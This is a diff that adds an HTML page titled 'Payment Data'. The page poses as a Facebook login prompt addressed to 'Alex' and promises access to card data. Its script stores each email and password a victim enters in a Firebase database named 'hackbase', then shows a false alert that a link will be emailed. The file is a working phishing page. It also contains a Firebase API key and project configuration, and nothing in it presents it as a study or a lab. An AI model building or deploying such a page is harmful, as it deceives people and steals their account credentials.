@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Payment Data</title>
+    <!-- Bootstrap core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <!-- Animate CSS -->
+	  <link href="css/animate.min.css" rel="stylesheet">
+    <style>
+    div{
+      border: 5px white solid;
+      border-radius: 15px;
+      width: 50%;
+      height: 60%;
+      margin-top: 100px;
+      background: #A9A9A9;
+      font-family: arial;
+      color: white;
+    }
+
+    #send{
+      font-size: 30px;
+      border-radius: 10px;
+      color: white;
+      background: #33ccff;
+    }
+
+    input{
+      color: black;
+      border: 2px black solid;
+    }
+
+
+    img{
+      margin: 15px;
+      border: 2px white solid;
+      border-radius: 30px;
+    }
+
+    body{
+      background: url('https://png.pngtree.com/thumb_back/fw800/back_pic/04/14/75/49582074207339b.jpg');
+      background-repeat: no-repeat;
+      background-attachment:fixed;
+      background-size: cover;
+    }
+
+    </style>
+
+    <script src="https://www.gstatic.com/firebasejs/5.3.1/firebase.js"></script>
+    <script>
+      // Initialize Firebase
+      var config = {
+        apiKey: "AIzaSyD7rOKa9URVyH05_bWeY3maB60zNeFBlq8",
+        authDomain: "hackbase-6d6bb.firebaseapp.com",
+        databaseURL: "https://hackbase-6d6bb.firebaseio.com",
+        projectId: "hackbase-6d6bb",
+        storageBucket: "hackbase-6d6bb.appspot.com",
+        messagingSenderId: "884151566427"
+      };
+      firebase.initializeApp(config);
+    </script>
+
+      <script>
+      var database = firebase.database();
+      var num = 0;
+      function login(){
+
+        var passw = document.getElementById("pass").value;
+        var mail = document.getElementById("email").value;
+
+        firebase.database().ref('User/U_' + num).set({
+          email: mail,
+          pasword : passw
+          });
+
+        num = num +1;
+        alert("YOU WILL BE EMAILED A LINK TO ACCESS YOUR CARD DATA SHORTLY");
+      }
+      </script>
+
+  </head>
+
+  <body>
+
+    <center>
+      <div>
+        <img width="150px" height="150px" src="https://scontent.fkin1-1.fna.fbcdn.net/v/t1.0-9/38866614_10155292351887924_6930680479494438912_n.jpg?_nc_cat=0&oh=f4d81b0ba3f39def46e838d93a6f5e5f&oe=5C06733E">
+        <h3>Hi Alex, <br>Please login to your Facebook account <br> to continue to payment data</h3><br>
+        Email: <input id="email" type="email">
+        password: <input id="pass" type="password"><br><br>
+
+        <input id ="send" type="button" onclick="login()" value="Login"><br>
+      </div>
+    </center>
+
+  </body>
+</html>
